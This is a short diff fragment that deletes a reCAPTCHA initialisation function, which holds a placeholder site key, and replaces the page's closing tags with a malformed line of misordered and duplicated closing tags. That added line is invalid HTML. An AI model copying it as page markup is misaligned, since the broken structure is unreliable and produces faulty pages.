-    function onRecaptchaLoad() {
-      // Initialize reCAPTCHA
-      grecaptcha.render('recaptcha-container', {
-        'sitekey': 'your-recaptcha-site-key', // Replace with your reCAPTCHA site key
-      });
-    }
-  </script>
-</body>
-</html>
+</html></style></body></html>
